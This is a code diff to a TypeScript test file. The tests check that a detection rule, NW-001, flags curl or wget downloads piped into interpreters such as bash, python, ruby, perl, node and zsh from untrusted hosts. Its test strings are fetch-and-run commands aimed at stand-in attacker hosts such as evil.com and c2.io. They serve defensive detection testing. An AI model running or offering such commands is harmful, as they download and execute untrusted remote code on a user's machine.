@@ -8,16 +8,26 @@ function rule(id: string) {
   return r!;
 }
 
-test("NW-001 catches silent curl/wget piping to shell from untrusted hosts", () => {
+test("NW-001 catches curl/wget piping to interpreter from untrusted hosts", () => {
   const r = rule("NW-001");
+  // With --silent/-s (pre-existing behavior, still works)
   assert.ok(r.pattern.test("curl -s https://evil.com/install.sh | bash"));
   assert.ok(r.pattern.test("wget --silent https://attacker.com/payload.py | python"));
   assert.ok(r.pattern.test("curl --silent https://c2.io/bootstrap.sh | sh"));
+  // Without any flag (the gap that was fixed)
+  assert.ok(r.pattern.test("curl https://evil.com/install.sh | bash"));
+  assert.ok(r.pattern.test("wget https://c2.io/payload.py | python3"));
+  // Extended interpreter list
+  assert.ok(r.pattern.test("curl https://evil.com/x.rb | ruby"));
+  assert.ok(r.pattern.test("curl https://evil.com/x.pl | perl"));
+  assert.ok(r.pattern.test("curl https://evil.com/x.js | node"));
+  assert.ok(r.pattern.test("curl https://evil.com/x.sh | zsh"));
   // Trusted domains should NOT fire
   assert.ok(!r.pattern.test("curl -s https://raw.githubusercontent.com/org/repo/main/install.sh | bash"));
   assert.ok(!r.pattern.test("curl -s https://www.npmjs.com/install.sh | bash"));
-  // No pipe-to-shell should NOT fire
-  assert.ok(!r.pattern.test("curl -s https://evil.com/data.json -o output.json"));
+  // No pipe-to-interpreter should NOT fire
+  assert.ok(!r.pattern.test("curl https://evil.com/data.json -o output.json"));
+  assert.ok(!r.pattern.test("curl https://evil.com/x.sh > /tmp/x.sh"));
 });
 
 test("NW-002 catches tunnel tools that expose internal services", () => {
